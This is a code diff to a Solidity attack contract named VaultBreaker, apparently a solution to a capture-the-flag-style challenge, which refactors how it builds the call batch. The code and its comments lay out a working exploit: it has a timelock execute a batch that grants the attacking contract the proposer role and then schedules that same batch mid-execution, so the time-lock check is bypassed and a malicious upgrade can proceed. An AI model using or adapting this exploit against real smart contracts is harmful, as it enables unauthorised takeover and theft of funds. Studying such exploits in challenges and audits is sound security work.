@@ -108,7 +108,7 @@ contract VaultBreaker {
     
     // SALT value and the bytes32 of the role we want
     bytes32 constant SALT1 = 0x9fd09c38c2a5ae0a0bcd617872b735e37909ccc05c956460be7d3d03d881a0dc;
-    bytes32 constant PROPOSER_ROLE = bytes32(hex"b09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1");
+    bytes32 constant PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;
     
     
     function returnResolveCallOne() public pure returns (bytes memory) {
@@ -123,39 +123,36 @@ contract VaultBreaker {
         return abi.encodeWithSelector(JUST_UPGRADE, _newVault);
     }
 
+    function returnOperation(address _target) public view returns(address[] memory, uint256[] memory, bytes[] memory) {
+        address[] memory targets = new address[](2);
+        uint256[] memory values = new uint256[](2);
+        bytes[] memory datas = new bytes[](2);
+
+        targets[0] = _target;
+        targets[1] = address(this);
+        datas[0] = returnGetProposerRole();
+        datas[1] = returnResolveCallOne();
+        return (targets, values, datas);
+    }
+
     // first call to execute, sends grantRole and second contract call
     function callOne(address _target) external {
         // We do this here so that it can be reused during resolveCallOne
         target = _target;
-        
-        address[] memory targets = new address[](2);
-        uint256[] memory values = new uint256[](2);
-        bytes[] memory datas = new bytes[](2);
-        targets[0] = target;
-        targets[1] = address(this);
-        datas[0] = returnGetProposerRole();
-        datas[1] = returnResolveCallOne();
-        
         // This call kicks off the execution, with the second call in the set a call to resolveCallOne, 
         // while the first sets this attacking contract as a PROPOSER (via returnGetProposerRole). As a 
         // proposer, the schedule call in the next function will succeed.
+        (address[] memory targets, uint256[] memory values, bytes[] memory datas) = returnOperation(target);
         (bool success, bytes memory _msg) = target.call(abi.encodeWithSelector(EXECUTE, targets, values, datas, SALT1));
         require(success, string(_msg));
     }
 
     function resolveCallOne() external {
-        address[] memory targets = new address[](2);
-        uint256[] memory values = new uint256[](2);
-        bytes[] memory datas = new bytes[](2);
-        targets[0] = target;
-        targets[1] = address(this);
-        datas[0] = returnGetProposerRole();
-        datas[1] = returnResolveCallOne();
-        
         // This call sets the previous exec call in the scheduler, in order to pass the existence check. As long as
         // the scheduled task is executed inside of the same hour, it will automatically pass the intended timelock check
         // that should exclude it. However, the exec will still fail because the Enum is initalized to a 0 value, which
         // also won't pass the check. This call causes the malicious job to be set as a real scheduled job.
+        (address[] memory targets, uint256[] memory values, bytes[] memory datas) = returnOperation(target);
         (bool success, bytes memory _msg) = target.call(abi.encodeWithSelector(SCHEDULE, targets, values, datas, SALT1));
         require(success, string(_msg));
     }
